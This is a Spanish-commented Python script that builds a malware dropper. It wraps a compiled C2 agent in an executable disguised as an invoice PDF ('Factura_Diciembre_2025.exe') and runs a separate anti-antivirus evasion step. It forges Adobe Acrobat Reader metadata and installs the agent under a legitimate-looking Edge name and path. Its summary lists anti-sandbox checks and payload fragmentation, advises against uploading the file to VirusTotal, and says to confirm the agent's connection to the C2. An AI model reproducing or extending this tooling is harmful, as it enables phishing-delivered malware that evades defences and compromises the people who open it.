#!/usr/bin/env python3
"""
Script rápido para reconstruir dropper con mejor evasión
"""

import sys
import subprocess
from pathlib import Path

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║         Dropper Rebuild con Evasión Mejorada                 ║
╚══════════════════════════════════════════════════════════════╝
""")
    
    # Configuración
    AGENT_PATH = Path("../agent/target/release/agent.exe")
    PDF_PATH = Path("sample_invoice.pdf")  # Cambiar por PDF real
    OUTPUT_NAME = "Factura_Diciembre_2025.exe"
    ICON_PATH = Path("pdf_icon.ico")
    
    # Verificar agent
    if not AGENT_PATH.exists():
        print(f"[❌] Agent no encontrado: {AGENT_PATH}")
        print(f"[💡] Compilar con: cd ../agent && cargo build --release")
        return 1
    
    print(f"[✅] Agent encontrado: {AGENT_PATH}")
    print(f"[📊] Tamaño: {AGENT_PATH.stat().st_size / (1024*1024):.2f} MB\n")
    
    # Paso 1: Generar dropper mejorado
    print("[1/3] Generando dropper embebido...")
    
    cmd = [
        sys.executable,
        "embedded_dropper.py",
        "--agent", str(AGENT_PATH),
        "--output", OUTPUT_NAME,
        "--icon", str(ICON_PATH),
        "--agent-name", "msedge_proxy.exe",  # Nombre legítimo
    ]
    
    if PDF_PATH.exists():
        cmd.extend(["--pdf", str(PDF_PATH)])
        print(f"[✅] Usando PDF real: {PDF_PATH}")
    else:
        print(f"[⚠️] PDF no encontrado, usando dummy")
        print(f"[💡] Para mejor evasión, usa PDF real: --pdf tu_documento.pdf")
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[❌] Error generando dropper:")
        print(result.stderr)
        return 1
    
    print(result.stdout)
    
    # Paso 2: Mejorar evasión
    print("\n[2/3] Aplicando técnicas anti-AV...")
    
    cmd = [
        sys.executable,
        "enhance_av_evasion.py",
        OUTPUT_NAME,
        "--backup"
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[❌] Error mejorando evasión:")
        print(result.stderr)
        return 1
    
    print(result.stdout)
    
    # Paso 3: Metadata PE (requiere rcedit)
    print("\n[3/3] Aplicando metadata PE...")
    
    rcedit = Path("rcedit.exe")
    if rcedit.exists():
        metadata_cmds = [
            [str(rcedit), OUTPUT_NAME, "--set-version-string", "CompanyName", "Adobe Systems Incorporated"],
            [str(rcedit), OUTPUT_NAME, "--set-version-string", "FileDescription", "Adobe Acrobat Reader DC"],
            [str(rcedit), OUTPUT_NAME, "--set-version-string", "ProductName", "Adobe Acrobat Reader DC"],
            [str(rcedit), OUTPUT_NAME, "--set-version-string", "LegalCopyright", "Copyright © 2024 Adobe Inc."],
            [str(rcedit), OUTPUT_NAME, "--set-file-version", "23.006.20380"],
            [str(rcedit), OUTPUT_NAME, "--set-product-version", "23.006.20380"],
        ]
        
        for cmd in metadata_cmds:
            subprocess.run(cmd, capture_output=True)
        
        print(f"[✅] Metadata PE aplicado (simula Adobe Reader)")
    else:
        print(f"[⚠️] rcedit.exe no encontrado")
        print(f"[💡] Descargar: https://github.com/electron/rcedit/releases")
    
    # Resumen final
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   ✅ Proceso Completado                       ║
╚══════════════════════════════════════════════════════════════╝

📦 Archivo generado: {OUTPUT_NAME}
📊 Tamaño: {Path(OUTPUT_NAME).stat().st_size / (1024*1024):.2f} MB
💾 Backup: {OUTPUT_NAME}.bak

🛡️ Técnicas aplicadas:
  ✅ Payload fragmentado en 5 partes
  ✅ Anti-sandbox detection (uptime, CPU, temp files)
  ✅ Delays realistas (3-5 segundos)
  ✅ Path legítimo: %LOCALAPPDATA%\\Microsoft\\Edge\\User Data
  ✅ Nombre legítimo: msedge_proxy.exe
  ✅ Timestamp PE modificado
  ✅ Overlay data añadido
  ✅ Metadata PE (Adobe Reader)

⚠️ IMPORTANTE:
  • Testear en VM ANTES de usar
  • NO subir a VirusTotal
  • Usar PDF real para mejor resultado
  • Cambiar OUTPUT_NAME a algo específico

🧪 Testing:
  1. Ejecutar en VM con Windows Defender activado
  2. Verificar que abre PDF correctamente
  3. Verificar que no muestra alertas
  4. Confirmar conexión del agent al C2

📚 Más info: dropper/AV_EVASION_GUIDE.md
""")
    
    return 0


if __name__ == '__main__':
    sys.exit(main())
